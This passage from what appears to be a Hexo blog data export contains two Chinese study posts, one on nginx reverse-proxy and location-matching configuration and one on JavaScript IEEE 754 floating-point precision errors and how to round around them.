的正则表达式。正则表达式前面需要放置~。相应的请求将会被影射到/data/images 路径。</p>\n<p>当 nginx 选择一个 location 指令块去服务一个请求，它首先检查 location 指令指定的前缀（并记住此最长前缀），然后检查正则表达式。如果有一个正则表达式匹配了，nginx 选中此 location，否则，它将会应用前一个记住的 location。</p>\n<p>最后，代理服务器的配置将会是这样：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">\tlocation / &#123;</span><br><span class=\"line\">\t\tproxy_pass http:<span class=\"comment\">//localhost:8080;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocation ~ \\.(gif|jpg|png)$ &#123;</span><br><span class=\"line\">\t\troot /data/images;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此服务器将会过滤那些以.gif，.jpg 或.png 结尾的请求，并且影射它们到/data/images 目录。传递其他所有请求到上面配置的代理服务上去。</p>\n<h2 id=\"location\"><a href=\"#location\" class=\"headerlink\" title=\"location\"></a>location</h2><ul>\n<li>= 开头表示精确匹配</li>\n<li>^~ 开头表示 uri 以某个常规字符串开头，不是正则匹配</li>\n<li>~ 开头表示区分大小写的正则匹配;</li>\n<li>~* 开头表示不区分大小写的正则匹配</li>\n<li>/ 通用匹配, 如果没有其它匹配,任何请求都会匹配到</li>\n</ul>\n<p>顺序 no 优先级：</p>\n<p>(location =) &gt; (location 完整路径) &gt; (location ^~ 路径) &gt; (location ~,~* 正则顺序) &gt; (location 部分起始路径) &gt; (/)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#直接匹配网站根，通过域名访问网站首页比较频繁，使用这个会加速处理</span><br><span class=\"line\">#这里是直接转发给后端应用服务器了，也可以是一个静态首页</span><br><span class=\"line\"># 第一个必选规则</span><br><span class=\"line\">location = / &#123;</span><br><span class=\"line\">    proxy_pass http://tomcat:8080/index</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 第二个必选规则是处理静态文件请求，这是nginx作为http服务器的强项</span><br><span class=\"line\"># 有两种配置模式，目录匹配或后缀匹配,任选其一或搭配使用</span><br><span class=\"line\">location ^~ /static/ &#123;</span><br><span class=\"line\">    root /webroot/static/;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~* \\.(gif|jpg|jpeg|png|css|js|ico)$ &#123;</span><br><span class=\"line\">    root /webroot/res/;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#第三个规则就是通用规则，用来转发动态请求到后端应用服务器</span><br><span class=\"line\">#非静态文件请求就默认是动态请求，自己根据实际把握</span><br><span class=\"line\">#毕竟目前的一些框架的流行，带.php,.jsp后缀的情况很少了</span><br><span class=\"line\">location / &#123;</span><br><span class=\"line\">    proxy_pass http://tomcat:8080/</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>前情提要：由于公司也是使用 nignx 解决前后端分离跨域问题，这里简单学习一下</p>\n</blockquote>\n<h2 id=\"设置简单的代理服务器\"><a href=\"#设置简单的代理服务器\" class=\"headerlink\" title=\"设置简单的代理服务器\"></a>设置简单的代理服务器</h2><p>设置一个代理服务器，它即是一个用来接收请求，并传递它们到代理服务器，取回响应并发送响应给客户端的服务器。</p>\n<p>我们将会配置一个简单的代理服务器，它将用本地文件来提供图片请求，而把其他请求转发到代理服务器。这个例子中，这两个服务器都将被定义在一个 nginx 实例中。</p>\n<p>首先，在上面配置的基础上再添加一个 server 指令块到 nginx 的配置文件中：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">\tlisten <span class=\"number\">8080</span>;</span><br><span class=\"line\">\troot /data/upl;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocation / &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是一个监听在 8080 端口（location 指令没有指定，默认会使用 80 端口），并且会映射所有请求到本地路径/data/upl 的简单服务器。创建此路径并在里面创建 index.html 文件。注意 root 指令要放在 server 上下文中。这种 root 指令将会在没有自己 root 指令的 location 指令块被选中来处理请求时应用。</p>\n<p>下一步，使用上一节的服务器配置，并且修改其为一个代理服务器配置。在第一个 location 指令块，放置 proxy_pass 指令，将代理服务器的地址作为参数（包括代理服务器的协议，域名和端口号）。例子中，它是<a href=\"http://localhost:8080：\" target=\"_blank\" rel=\"noopener\">http://localhost:8080：</a></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">\tlocation / &#123;</span><br><span class=\"line\">\t\tproxy_pass http:<span class=\"comment\">//localhost:8080;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocation /images/ &#123;</span><br><span class=\"line\">\t\troot /data;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>第二个 location 指令块目前指定的是/images/前缀到/data/images 路径的映射，为了使其能根据文件后缀匹配相应图片的请求，我们修改之：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location ~ \\.(gif|jpg|png)$ &#123;</span><br><span class=\"line\">\troot /data/images;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里参数是一个匹配哪些以.gif，.jpg 或者.png 结尾的 URIs 的正则表达式。正则表达式前面需要放置~。相应的请求将会被影射到/data/images 路径。</p>\n<p>当 nginx 选择一个 location 指令块去服务一个请求，它首先检查 location 指令指定的前缀（并记住此最长前缀），然后检查正则表达式。如果有一个正则表达式匹配了，nginx 选中此 location，否则，它将会应用前一个记住的 location。</p>\n<p>最后，代理服务器的配置将会是这样：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">\tlocation / &#123;</span><br><span class=\"line\">\t\tproxy_pass http:<span class=\"comment\">//localhost:8080;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocation ~ \\.(gif|jpg|png)$ &#123;</span><br><span class=\"line\">\t\troot /data/images;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此服务器将会过滤那些以.gif，.jpg 或.png 结尾的请求，并且影射它们到/data/images 目录。传递其他所有请求到上面配置的代理服务上去。</p>\n<h2 id=\"location\"><a href=\"#location\" class=\"headerlink\" title=\"location\"></a>location</h2><ul>\n<li>= 开头表示精确匹配</li>\n<li>^~ 开头表示 uri 以某个常规字符串开头，不是正则匹配</li>\n<li>~ 开头表示区分大小写的正则匹配;</li>\n<li>~* 开头表示不区分大小写的正则匹配</li>\n<li>/ 通用匹配, 如果没有其它匹配,任何请求都会匹配到</li>\n</ul>\n<p>顺序 no 优先级：</p>\n<p>(location =) &gt; (location 完整路径) &gt; (location ^~ 路径) &gt; (location ~,~* 正则顺序) &gt; (location 部分起始路径) &gt; (/)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#直接匹配网站根，通过域名访问网站首页比较频繁，使用这个会加速处理</span><br><span class=\"line\">#这里是直接转发给后端应用服务器了，也可以是一个静态首页</span><br><span class=\"line\"># 第一个必选规则</span><br><span class=\"line\">location = / &#123;</span><br><span class=\"line\">    proxy_pass http://tomcat:8080/index</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># 第二个必选规则是处理静态文件请求，这是nginx作为http服务器的强项</span><br><span class=\"line\"># 有两种配置模式，目录匹配或后缀匹配,任选其一或搭配使用</span><br><span class=\"line\">location ^~ /static/ &#123;</span><br><span class=\"line\">    root /webroot/static/;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">location ~* \\.(gif|jpg|jpeg|png|css|js|ico)$ &#123;</span><br><span class=\"line\">    root /webroot/res/;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#第三个规则就是通用规则，用来转发动态请求到后端应用服务器</span><br><span class=\"line\">#非静态文件请求就默认是动态请求，自己根据实际把握</span><br><span class=\"line\">#毕竟目前的一些框架的流行，带.php,.jsp后缀的情况很少了</span><br><span class=\"line\">location / &#123;</span><br><span class=\"line\">    proxy_pass http://tomcat:8080/</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"js浮点数的坑","date":"2018-05-06T03:22:06.000Z","_content":"\n## 浮点数在计算机中的表示\n\n* 日常中，32767 这个数用科学计数法可以写成 3.2767\\*10^4，3.2767 称为尾数(Mantissa)，4 就是指数(exponent)\n* 浮点数在计算机中基于科学技术法来表示的，上面是我们日常用十进制来表示，计算机则是二进制，它的基数是 2 不是 10\n\n## 一种浮点数格式\n\n> 假设共有 14bits，5bits 表指数，8bits 表尾数，1bit 表示符号\n\n* 17=>10001=1.0001\\*2^4 类比十进制的 1.7\\*10^5\n\n### 尾数部分\n\n* 因为尾数在十进制里面 0<尾数<10，在二进制里面就是 0<尾数<2，那么规定最高位只能是 1\n* 因为尾数默认是 1，所以这个 1 就不用保存了，可以节省一位提高精度。所以尾数部分本来是 10001，这样就只用存储 0001，去掉了 1\n* 需要注意的是，这里我们尾数的有效位数是 8 位，而 128.25=>10000000.01,需要 10 个有效位，而我们的模型中尾数部分是 8 位，算上隐含的最高位 1 也才 9 个有效位，所以 128.25 只能舍去末尾的 1，表示为 10000000.0，其实跟 128 相等。所以浮点数不能做精确比较就是这样的\n\n### 指数部分\n\n* 但是指数部分是 4，换算成二进制也就是 100，如果以为是 100 就错了。\n* 因为 0.25=>0.01=1\\*10^-2,但是这样我们无法用指数表示负数。第一个符号位表示的是整个数的正负\n* 现在广泛采用的是偏移的指数。规定一个偏移值，比如偏移值是 16，实际的指数要加上这个偏移值才可以，这样比 16 大的就是正指数，小的就是负指数。\n* 要表示 0.25，如果偏移值 16，那么指数部分是 14，要表示 17 的指数部分，是 16+5=21,换成二进制就是 10101\n\n| 1bit     |  5bits   |    8bits |\n| -------- | :------: | -------: |\n| sign bit | exponent | Mantissa |\n| 符号位   |   指数   |     尾数 |\n| 0        |  10101   | 00010000 |\n\n## js 的浮点数标准\n\n> js 的 number 遵循 IEEE 754 标准，使用 64 位固定长度表示，也就是 64 位 double 双精度浮点数（类似的有 float 32 位单精度标准）\n\n* 大多数语言的小数默认都是遵循这个标准，所以 js 有的问题他们也有，包括 java，ruby，python\n* 64bits 分为三部分\n  * 符号 S：1bit，0 表示正数，1 表示负数\n  * 指数 E：中间的 11 位存储指数\n  * 尾数 M：最后的 52 位是尾数\n* 因为指数 E 有 11 位，取值范围是 2^11=2048，也就是[0,2047]，所以约定的偏移值是 1023，[0,1023]是负数\n\n### 浮点误差\n\n> 浮点数不是精确存储的\n\n#### 0.1 浮点误差（转成二进制无限循环）\n\n* 0.1 转成二进制==0.0001100110011001100(1100 循环)=1.100110011001100(1100 循环)x2^-4，因为尾数舍去首位的 1，存的是后面的数，但是最多也只能存 52 位，然后再把有误差的只有 52 位尾数的，转成十进制，就变成了 0.100000000000000005551115123126\n* 0.1+0.2=0.30000000000000004，那是因为把这两个转成二进制（这里就有误差了）后再运算，然后再转回十进制，正好是 0.30000000000000004\n\n#### 为什么 x=0.1 就能得到 0.1\n\n* 因为尾数的固定长度是 52 位，那么加上省略的一位，最多可以表示的数位 2^53=9007199254740992，对应科学计数尾数是 9.007199254740992,我们只用记住 2^53 就好了\n* 2^53 的长度是 16 位,这也是 js 最多能表示的精度\n* 所以可以近似用 toPrecision(16) 来做精度运算，超过的精度会自动凑整处理\n* Precision 是精确的意思\n* 所以 0.1 转成二进制然后再成十进制是 0.100000000000000005551115123126.toPrecision(16)=0.1000000000000000，去掉末尾的 0 正好是 0.1\n* 所以我们看到的 0.1 并不是 0.1\n* 可以用更高的精度解释：0.1.toPrecision(21) = 0.100000000000000005551\n\n#### toPrecision vs toFixed\n\n> 两者都能对多余数字取整，但是，前者是处理精度，精度是从左到右第一个不为 0 的数开始计算。后者是小数点指定位数取整，从小数点开始数起来\n\n* 有些用 toFixed 用来四舍五入，但是其实是有 bug 的，\n* 1.005.toFixed(2)=1.00 而不是 1.01\n* 因为 1.005 实际上是 1.00499999999999989，4 是进不了 1 的\n\n## 解决浮点数方案\n\n> 由于理论上用有限的空间来存储无限的小数是不可能保证精确的，但是我们可以处理一下得到我们精确的结果\n\n### 数据展示类\n\n* 1.4000000000000001 这样的数据要展示的话，建议使用 toPrecision 凑整并 parseFloat 转成数字后再显示\n* parseFloat(1.4000000000000001.toPrecision(12)) === 1.4\n* 为什么选用 12 作为精度，因为这是一个经验之谈，大部分够用了\n\n### 数据运算类\n\n* 要把小数转成整数后再运算\n","source":"_posts/study-number.md","raw":"---\ntitle: js浮点数的坑\ndate: 2018-05-06 11:22:06\ntags: javascript\n---\n\n## 浮点数在计算机中的表示\n\n* 日常中，32767 这个数用科学计数法可以写成 3.2767\\*10^4，3.2767 称为尾数(Mantissa)，4 就是指数(exponent)\n* 浮点数在计算机中基于科学技术法来表示的，上面是我们日常用十进制来表示，计算机则是二进制，它的基数是 2 不是 10\n\n## 一种浮点数格式\n\n> 假设共有 14bits，5bits 表指数，8bits 表尾数，1bit 表示符号\n\n* 17=>10001=1.0001\\*2^4 类比十进制的 1.7\\*10^5\n\n### 尾数部分\n\n* 因为尾数在十进制里面 0<尾数<10，在二进制里面就是 0<尾数<2，那么规定最高位只能是 1\n* 因为尾数默认是 1，所以这个 1 就不用保存了，可以节省一位提高精度。所以尾数部分本来是 10001，这样就只用存储 0001，去掉了 1\n* 需要注意的是，这里我们尾数的有效位数是 8 位，而 128.25=>10000000.01,需要 10 个有效位，而我们的模型中尾数部分是 8 位，算上隐含的最高位 1 也才 9 个有效位，所以 128.25 只能舍去末尾的 1，表示为 10000000.0，其实跟 128 相等。所以浮点数不能做精确比较就是这样的\n\n### 指数部分\n\n* 但是指数部分是 4，换算成二进制也就是 100，如果以为是 100 就错了。\n* 因为 0.25=>0.01=1\\*10^-2,但是这样我们无法用指数表示负数。第一个符号位表示的是整个数的正负\n* 现在广泛采用的是偏移的指数。规定一个偏移值，比如偏移值是 16，实际的指数要加上这个偏移值才可以，这样比 16 大的就是正指数，小的就是负指数。\n* 要表示 0.25，如果偏移值 16，那么指数部分是 14，要表示 17 的指数部分，是 16+5=21,换成二进制就是 10101\n\n| 1bit     |  5bits   |    8bits |\n| -------- | :------: | -------: |\n| sign bit | exponent | Mantissa |\n| 符号位   |   指数   |     尾数 |\n| 0        |  10101   | 00010000 |\n\n## js 的浮点数标准\n\n> js 的 number 遵循 IEEE 754 标准，使用 64 位固定长度表示，也就是 64 位 double 双精度浮点数（类似的有 float 32 位单精度标准）\n\n* 大多数语言的小数默认都是遵循这个标准，所以 js 有的问题他们也有，包括 java，ruby，python\n* 64bits 分为三部分\n  * 符号 S：1bit，0 表示正数，1 表示负数\n  * 指数 E：中间的 11 位存储指数\n  * 尾数 M：最后的 52 位是尾数\n* 因为指数 E 有 11 位，取值范围是 2^11=2048，也就是[0,2047]，所以约定的偏移值是 1023，[0,1023]是负数\n\n### 浮点误差\n\n> 浮点数不是精确存储的\n\n#### 0.1 浮点误差（转成二进制无限循环）\n\n* 0.1 转成二进制==0.0001100110011001100(1100 循环)=1.100110011001100(1100 循环)x2^-4，因为尾数舍去首位的 1，存的是后面的数，但是最多也只能存 52 位，然后再把有误差的只有 52 位尾数的，转成十进制，就变成了 0.100000000000000005551115123126\n* 0.1+0.2=0.30000000000000004，那是因为把这两个转成二进制（这里就有误差了）后再运算，然后再转回十进制，正好是 0.30000000000000004\n\n#### 为什么 x=0.1 就能得到 0.1\n\n* 因为尾数的固定长度是 52 位，那么加上省略的一位，最多可以表示的数位 2^53=9007199254740992，对应科学计数尾数是 9.007199254740992,我们只用记住 2^53 就好了\n* 2^53 的长度是 16 位,这也是 js 最多能表示的精度\n* 所以可以近似用 toPrecision(16) 来做精度运算，超过的精度会自动凑整处理\n* Precision 是精确的意思\n* 所以 0.1 转成二进制然后再成十进制是 0.100000000000000005551115123126.toPrecision(16)=0.1000000000000000，去掉末尾的 0 正好是 0.1\n* 所以我们看到的 0.1 并不是 0.1\n* 可以用更高的精度解释：0.1.toPrecision(21) = 0.100000000000000005551\n\n#### toPrecision vs toFixed\n\n> 两者都能对多余数字取整，但是，前者是处理精度，精度是从左到右第一个不为 0 的数开始计算。后者是小数点指定位数取整，从小数点开始数起来\n\n* 有些用 toFixed 用来四舍五入，但是其实是有 bug 的，\n* 1.005.toFixed(2)=1.00 而不是 1.01\n* 因为 1.005 实际上是 1.00499999999999989，4 是进不了 1 的\n\n## 解决浮点数方案\n\n> 由于理论上用有限的空间来存储无限的小数是不可能保证精确的，但是我们可以处理一下得到我们精确的结果\n\n### 数据展示类\n\n* 1.4000000000000001 这样的数据要展示的话，建议使用 toPrecision 凑整并 parseFloat 转成数字后再显示\n* parseFloat(1.4000000000000001.toPrecision(12)) === 1.4\n* 为什么选用 12 作为精度，因为这是一个经验之谈，大部分够用了\n\n### 数据运算类\n\n* 要把小数转成整数后再运算\n","slug":"study-number","published":1,"updated":"2018-06-04T07:29:30.305Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034rr003j0iofyba1jr0o","content":"<h2 id=\"浮点数在计算机中的表示\"><a href=\"#浮点数在计算机中的表示\" class=\"headerlink\" title=\"浮点数在计算机中的表示\"></a>浮点数在计算机中的表示</h2><ul>\n<li>日常中，32767 这个数用科学计数法可以写成 3.2767*10^4，3.2767 称为尾数(Mantissa)，4 就是指数(exponent)</li>\n<li>浮点数在计算机中基于科学技术法来表示的，上面是我们日常用十进制来表示，计算机则是二进制，它的基数是 2 不是 10</li>\n</ul>\n<h2 id=\"一种浮点数格式\"><a href=\"#一种浮点数格式\" class=\"headerlink\" title=\"一种浮点数格式\"></a>一种浮点数格式</h2><blockquote>\n<p>假设共有 14bits，5bits 表指数，8bits 表尾数，1bit 表示符号</p>\n</blockquote>\n<ul>\n<li>17=&gt;10001=1.0001*2^4 类比十进制的 1.7*10^5</li>\n</ul>\n<h3 id=\"尾数部分\"><a href=\"#尾数部分\" class=\"headerlink\" title=\"尾数部分\"></a>尾数部分</h3><ul>\n<li>因为尾数在十进制里面 0&lt;尾数&lt;10，在二进制里面就是 0&lt;尾数&lt;2，那么规定最高位只能是 1</li>\n<li>因为尾数默认是 1，所以这个 1 就不用保存了，可以节省一位提高精度。所以尾数部分本来是 10001，这样就只用存储 0001，去掉了 1</li>\n<li>需要注意的是，这里我们尾数的有效位数是 8 位，而 128.25=&gt;10000000.01,需要 10 个有效位，而我们的模型中尾数部分是 8 位，算上隐含的最高位 1 也才 9 个有效位，所以 128.25 只能舍去末尾的 1，表示为 10000000.0，其实跟 128 相等。所以浮点数不能做精确比较就是这样的</li>\n</ul>\n<h3 id=\"指数部分\"><a href=\"#指数部分\" class=\"headerlink\" title=\"指数部分\"></a>指数部分</h3><ul>\n<li>但是指数部分是 4，换算成二进制也就是 100，如果以为是 100 就错了。</li>\n<li>因为 0.25=&gt;0.01=1*10^-2,但是这样我们无法用指数表示负数。第一个符号位表示的是整个数的正负</li>\n<li>现在广泛采用的是偏移的指数。规定一个偏移值，比如偏移值是 16，实际的指数要加上这个偏移值才可以，这样比 16 大的就是正指数，小的就是负指数。</li>\n<li>要表示 0.25，如果偏移值 16，那么指数部分是 14，要表示 17 的指数部分，是 16+5=21,换成二进制就是 10101</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>1bit</th>\n<th style=\"text-align:center\">5bits</th>\n<th style=\"text-align:right\">8bits</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>sign bit</td>\n<td style=\"text-align:center\">exponent</td>\n<td style=\"text-align:right\">Mantissa</td>\n</tr>\n<tr>\n<td>符号位</td>\n<td style=\"text-align:center\">指数</td>\n<td style=\"text-align:right\">尾数</td>\n</tr>\n<tr>\n<td>0</td>\n<td style=\"text-align:center\">10101</td>\n<td style=\"text-align:right\">00010000</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"js-的浮点数标准\"><a href=\"#js-的浮点数标准\" class=\"headerlink\" title=\"js 的浮点数标准\"></a>js 的浮点数标准</h2><blockquote>\n<p>js 的 number 遵循 IEEE 754 标准，使用 64 位固定长度表示，也就是 64 位 double 双精度浮点数（类似的有 float 32 位单精度标准）</p>\n</blockquote>\n<ul>\n<li>大多数语言的小数默认都是遵循这个标准，所以 js 有的问题他们也有，包括 java，ruby，python</li>\n<li>64bits 分为三部分<ul>\n<li>符号 S：1bit，0 表示正数，1 表示负数</li>\n<li>指数 E：中间的 11 位存储指数</li>\n<li>尾数 M：最后的 52 位是尾数</li>\n</ul>\n</li>\n<li>因为指数 E 有 11 位，取值范围是 2^11=2048，也就是[0,2047]，所以约定的偏移值是 1023，[0,1023]是负数</li>\n</ul>\n<h3 id=\"浮点误差\"><a href=\"#浮点误差\" class=\"headerlink\" title=\"浮点误差\"></a>浮点误差</h3><blockquote>\n<p>浮点数不是精确存储的</p>\n</blockquote>\n<h4 id=\"0-1-浮点误差（转成二进制无限循环）\"><a href=\"#0-1-浮点误差（转成二进制无限循环）\" class=\"headerlink\" title=\"0.1 浮点误差（转成二进制无限循环）\"></a>0.1 浮点误差（转成二进制无限循环）</h4><ul>\n<li>0.1 转成二进制==0.0001100110011001100(1100 循环)=1.100110011001100(1100 循环)x2^-4，因为尾数舍去首位的 1，存的是后面的数，但是最多也只能存 52 位，然后再把有误差的只有 52 位尾数的，转成十进制，就变成了 0.100000000000000005551115123126</li>\n<li>0.1+0.2=0.30000000000000004，那是因为把这两个转成二进制（这里就有误差了）后再运算，然后再转回十进制，正好是 0.30000000000000004</li>\n</ul>\n<h4 id=\"为什么-x-0-1-就能得到-0-1\"><a href=\"#为什么-x-0-1-就能得到-0-1\" class=\"headerlink\" title=\"为什么 x=0.1 就能得到 0.1\"></a>为什么 x=0.1 就能得到 0.1</h4><ul>\n<li>因为尾数的固定长度是 52 位，那么加上省略的一位，最多可以表示的数位 2^53=9007199254740992，对应科学计数尾数是 9.007199254740992,我们只用记住 2^53 就好了</li>\n<li>2^53 的长度是 16 位,这也是 js 最多能表示的精度</li>\n<li>所以可以近似用 toPrecision(16) 来做精度运算，超过的精度会自动凑整处理</li>\n<li>Precision 是精确的意思</li>\n<li>所以 0.1 转成二进制然后再成十进制是 0.100000000000000005551115123126.toPrecision(16)=0.1000000000000000，去掉末尾的 0 正好是 0.1</li>\n<li>所以我们看到的 0.1 并不是 0.1</li>\n<li>可以用更高的精度解释：0.1.toPrecision(21) = 0.100000000000000005551</li>\n</ul>\n<h4 id=\"toPrecision-vs-toFixed\"><a href=\"#toPrecision-vs-toFixed\" class=\"headerlink\" title=\"toPrecision vs toFixed\"></a>toPrecision vs toFixed</h4><blockquote>\n<p>两者都能对多余数字取整，但是，前者是处理精度，精度是从左到右第一个不为 0 的数开始计算。后者是小数点指定位数取整，从小数点开始数起来</p>\n</blockquote>\n<ul>\n<li>有些用 toFixed 用来四舍五入，但是其实是有 bug 的，</li>\n<li>1.005.toFixed(2)=1.00 而不是 1.01</li>\n<li>因为 1.005 实际上是 1.00499999999999989，4 是进不了 1 的</li>\n</ul>\n<h2 id=\"解决浮点数方案\"><a href=\"#解决浮点数方案\" class=\"headerlink\" title=\"解决浮点数方案\"></a>解决浮点数方案</h2><blockquote>\n<p>由于理论上用有限的空间来存储无限的小数是不可能保证精确的，但是我们可以处理一下得到我们精确的结果</p>\n</blockquote>\n<h3 id=\"数据展示类\"><a href=\"#数据展示类\" class=\"headerlink\" title=\"数据展示类\"></a>数据展示类</h3><ul>\n<li>1.4000000000000001 这样的数据要展示的话，建议使用 toPrecision 凑整并 parseFloat 转成数字后再显示</li>\n<li>parseFloat(1.4000000000000001.toPrecision(12)) === 1.4</li>\n<li>为什么选用 12 作为精度，因为这是一个经验之谈，大部分够用了</li>\n</ul>\n<h3 id=\"数据运算类\"><a href=\"#数据运算类\" class=\"headerlink\" title=\"数据运算类\"></a>数据运算类</h3><ul>\n<li>要把小数转成整数后再运算</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"浮点数在计算机中的表示\"><a href=\"#浮点数在计算机中的表示\" class=\"headerlink\" title=\"浮点数在计算机中的表示\"></a>浮点数在计算机中的表示</h2><ul>\n<li>日常中，32767 这个数用科学计数法可以写成 3.2767*10^4，3.2767 称为尾数(Mantissa)，4 就是指数(exponent)</li>\n<li>浮点数在计算机中基于科学技术法来表示的，上面是我们日常用十进制来表示，计算机则是二进制，它的基数是 2 不是 10</li>\n</ul>\n<h2 id=\"一种浮点数格式\"><a href=\"#一种浮点数格式\" class=\"headerlink\" title=\"一种浮点数格式\"></a>一种浮点数格式</h2><blockquote>\n<p>假设共有 14bits，5bits 表指数，8bits 表尾数，1bit 表示符号</p>\n</blockquote>\n<ul>\n<li>17=&gt;10001=1.0001*2^4 类比十进制的 1.7*10^5</li>\n</ul>\n<h3 id=\"尾数部分\"><a href=\"#尾数部分\" class=\"headerlink\" title=\"尾数部分\"></a>尾数部分</h3><ul>\n<li>因为尾数在十进制里面 0&lt;尾数&lt;10，在二进制里面就是 0&lt;尾数&lt;2，那么规定最高位只能是 1</li>\n<li>因为尾数默认是 1，所以这个 1 就不用保存了，可以节省一位提高精度。所以尾数部分本来是 10001，这样就只用存储 0001，去掉了 1</li>\n<li>需要注意的是，这里我们尾数的有效位数是 8 位，而 128.25=&gt;10000000.01,需要 10 个有效位，而我们的模型中尾数部分是 8 位，算上隐含的最高位 1 也才 9 个有效位，所以 128.25 只能舍去末尾的 1，表示为 10000000.0，其实跟 128 相等。所以浮点数不能做精确比较就是这样的</li>\n</ul>\n<h3 id=\"指数部分\"><a href=\"#指数部分\" class=\"headerlink\" title=\"指数部分\"></a>指数部分</h3><ul>\n<li>但是指数部分是 4，换算成二进制也就是 100，如果以为是 100 就错了。</li>\n<li>因为 0.25=&gt;0.01=1*10^-2,但是这样我们无法用指数表示负数。第一个符号位表示的是整个数的正负</li>\n<li>现在广泛采用的是偏移的指数。规定一个偏移值，比如偏移值是 16，实际的指数要加上这个偏移值才可以，这样比 16 大的就是正指数，小的就是负指数。</li>\n<li>要表示 0.25，如果偏移值 16，那么指数部分是 14，要表示 17 的指数部分，是 16+5=21,换成二进制就是 10101</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>1bit</th>\n<th style=\"text-align:center\">5bits</th>\n<th style=\"text-align:right\">8bits</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>sign bit</td>\n<td style=\"text-align:center\">exponent</td>\n<td style=\"text-align:right\">Mantissa</td>\n</tr>\n<tr>\n<td>符号位</td>\n<td style=\"text-align:center\">指数</td>\n<td style=\"text-align:right\">尾数</td>\n</tr>\n<tr>\n<td>0</td>\n<td style=\"text-align:center\">10101</td>\n<td style=\"text-align:right\">00010000</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"js-的浮点数标准\"><a href=\"#js-的浮点数标准\" class=\"headerlink\" title=\"js 的浮点数标准\"></a>js 的浮点数标准</h2><blockquote>\n<p>js 的 number 遵循 IEEE 754 